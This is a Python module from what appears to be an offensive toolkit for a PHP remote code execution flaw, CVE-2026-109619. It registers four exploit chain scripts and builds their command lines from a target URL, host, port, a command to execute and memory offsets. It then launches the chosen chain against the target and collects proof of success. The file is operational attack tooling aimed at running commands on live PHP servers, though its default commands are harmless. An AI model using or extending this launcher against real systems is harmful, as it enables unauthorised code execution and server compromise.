"""lib/chain.py — exploit chain registry + dispatch for CVE-2026-109619.

This module is the SINGLE source of truth for "which chain runs for which
target". It does NOT reimplement the chains — the 5 chain implementations
live in `exploit/` (pure_off.py, remote_cve.py, auto_exp.py,
handler_mismatch.py, var_destroy_uaf_rce.php). This module dispatches to
them in-process via subprocess and normalizes the result.

ATtribution (read CREDITS in README):
  CVE-2026-109618 / 109619 ("PHP2Shell") was first found by Calif (Ryan A.)
  on 1 Aug 2026 and reported to PHP on 11 Aug 2026. Wiz Research found it
  independently (19 Aug, reported 24 Aug) — wiz.io/blog/php2shell-php-rce.
  OpenAI Codex Security reported an additional vector on 18 Sep. All three
  are credited in the PHP advisory. The chain technique in `exploit/` is a
  port of 9bie's public research (github.com/9bie/php2shell-bypass-aslr-exp)
  — a 2-request session.upload_progress UAF + ASLR bypass via heap/libphp
  leak + pDestructor actuator = zif_system. This is NOT our original work;
  it is an independent implementation of public research.

CVE mapping:
  CVE-2026-109618 "RCE via OOM corruption" — ONE request, OOM -> longjmp() ->
    request shutdown reads uninitialized request memory. Consumer = shutdown
    procedure. NOT implemented by this toolkit.
  CVE-2026-109619 "RCE via stale global state" — TWO requests on the same
    worker. Producer (req 1) emits request-owned state, then a fatal/OOM
    aborts it before reset. The request heap is freed but the worker global
    still points there. Req 2 reads that stale state via session upload
    progress BEFORE normal init resets it. THIS is what the chains implement.
"""

from __future__ import annotations

import os
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path

HERE = Path(__file__).resolve().parent.parent          # repo root
EXPLOIT_DIR = HERE / "exploit"

MAX_CMD = 14  # carrier zend_string is 167 bytes -> max command payload

# Chain scripts (relative to repo root). Each is a standalone CLI.
CHAIN_SCRIPTS = {
    "pure": EXPLOIT_DIR / "pure_off.py",          # production, display_errors=Off, 128M
    "remote": EXPLOIT_DIR / "remote_cve.py",     # 8M chain, remote
    "local": EXPLOIT_DIR / "auto_exp.py",        # local var_destroy UAF
    "mismatch": EXPLOIT_DIR / "handler_mismatch.py",  # handler mismatch (FPM)
}

CHAIN_DESC = {
    "pure": "production chain — display_errors=Off, 128M memory_limit, chunked bypass",
    "remote": "8M chain — small memory_limit, display_errors=On, remote",
    "local": "local var_destroy UAF — needs PHP binary on the attacker host",
    "mismatch": "handler mismatch — php_serialize vs php session handler (FPM)",
}


@dataclass
class ChainResult:
    chain: str
    returncode: int = -1
    stdout: str = ""
    stderr: str = ""
    success: bool = False
    proof: str = ""
    error: str = ""
    argv: list[str] = field(default_factory=list)
    duration: float = 0.0

    def as_dict(self) -> dict:
        return {
            "chain": self.chain,
            "returncode": self.returncode,
            "success": self.success,
            "proof": self.proof,
            "error": self.error,
            "argv": self.argv,
            "duration": round(self.duration, 2),
            "stdout_tail": self.stdout[-4000:],
            "stderr_tail": self.stderr[-2000:],
        }


def available_chains() -> list[str]:
    """Chains whose script files exist on disk."""
    return [name for name, p in CHAIN_SCRIPTS.items() if p.exists()]


def build_argv(chain: str, opts: dict) -> list[str]:
    """Build the argv for a chain script from normalized opts.

    opts keys (all optional unless the chain needs them):
      url, host, port, path, cmd, probes, retries, proof, proof_url, workers,
      wan (pure chain: small B1 body + long timeouts for slow uplinks),
      zif, dtor, htdata, libphp, profile, attempts, proof_file,
      php, tries, timeout, seed, fire, gadget, prop, sid
    """
    py = sys.executable
    if chain not in CHAIN_SCRIPTS:
        raise ValueError(f"unknown chain: {chain} (choices: "
                          f"{', '.join(CHAIN_SCRIPTS)})")
    script = str(CHAIN_SCRIPTS[chain])
    argv = [py, script]

    def a(*vals):
        for v in vals:
            if v is not None and v != "":
                argv.append(str(v))

    def opt(flag, val):
        # flag+value as a PAIR: skip both when the value is empty, so argparse
        # never sees a bare flag waiting for an argument.
        if val is not None and val != "":
            argv.append(flag)
            argv.append(str(val))

    if chain == "pure":
        opt("--url", opts.get("url") or "")
        if not opts.get("url"):
            a("--host", opts.get("host") or "127.0.0.1")
            a("--port", opts.get("port") or 8088)
            a("--path", opts.get("path") or "/index.php")
        a("--cmd", opts.get("cmd") or "id>p1.txt")
        a("--probes", opts.get("probes") or 20)
        a("--retries", opts.get("retries") or 3)
        a("--workers", opts.get("workers") or 1)
        opt("--zif-off", opts.get("zif") or "")
        opt("--dtor-off", opts.get("dtor") or "")
        opt("--s-off", opts.get("htdata") or "")
        # proof channel: local mount (lab) or HTTP read-back (remote)
        opt("--proof", opts.get("proof") or "")
        opt("--proof-url", opts.get("proof_url") or "")
        if opts.get("auto") or not opts.get("zif"):
            argv.append("--auto")
        if opts.get("wan"):
            argv.append("--wan")
        if opts.get("target_mem"):
            opt("--target-mem", opts["target_mem"])
    elif chain == "remote":
        a("-u", opts.get("url"))
        a("--cmd", opts.get("cmd") or "id>p1.txt")
        a("--profile", opts.get("profile") or "bookworm")
        a("--attempts", opts.get("attempts") or 3)
        opt("--zif", opts.get("zif") or "")
        opt("--dtor", opts.get("dtor") or "")
        opt("--htdata", opts.get("htdata") or "")
        opt("--libphp", opts.get("libphp") or "")
        opt("--proof-file", opts.get("proof") or "")
        opt("--proof-url", opts.get("proof_url") or "")
    elif chain == "local":
        a("--php", opts.get("php") or "php")
        a("--cmd", opts.get("cmd") or "id > /tmp/proof")
        a("--proof", opts.get("proof") or "/tmp/proof")
        a("--tries", opts.get("tries") or 5)
        a("--timeout", opts.get("timeout") or 20)
    elif chain == "mismatch":
        a("--seed", opts.get("seed"))
        a("--fire", opts.get("fire"))
        a("--cmd", opts.get("cmd") or "id > /tmp/proof")
        a("--gadget", opts.get("gadget") or "Evil")
        a("--prop", opts.get("prop") or "cmd")
        a("--sid", opts.get("sid") or "")
    else:
        raise ValueError(f"unknown chain: {chain}")
    return argv


def run_chain(chain: str, opts: dict, *, timeout: int = 300,
              log=None) -> ChainResult:
    """Run one chain script in-process (subprocess) and normalize the result.

    Does NOT support --revshell: that flag is not in any chain's parser and
    exploit_runner.validate_command rejects shell chaining tokens before
    we get here.
    """
    import time
    if chain not in CHAIN_SCRIPTS:
        return ChainResult(chain=chain, error=f"unknown chain: {chain}")
    script = CHAIN_SCRIPTS[chain]
    if not script.exists():
        return ChainResult(chain=chain,
                           error=f"chain script missing: {script}")

    argv = build_argv(chain, opts)
    res = ChainResult(chain=chain, argv=argv)
    t0 = time.monotonic()
    try:
        if log:
            log(f"chain={chain} argv={' '.join(argv[1:])}")
        proc = subprocess.run(
            argv, capture_output=True, text=True, timeout=timeout,
            cwd=str(HERE))
        res.returncode = proc.returncode
        res.stdout = proc.stdout or ""
        res.stderr = proc.stderr or ""
        res.success = proc.returncode == 0
        if not res.success:
            res.error = (res.stderr or res.stdout or
                         f"chain exited {proc.returncode}").strip()[:500]
    except subprocess.TimeoutExpired as e:
        res.error = f"chain timeout after {timeout}s"
        res.stdout = (e.stdout or "") if isinstance(e.stdout, str) else ""
        res.stderr = (e.stderr or "") if isinstance(e.stderr, str) else ""
    except Exception as exc:  # noqa: BLE001
        res.error = f"{type(exc).__name__}: {exc}"
    res.duration = time.monotonic() - t0
    return res
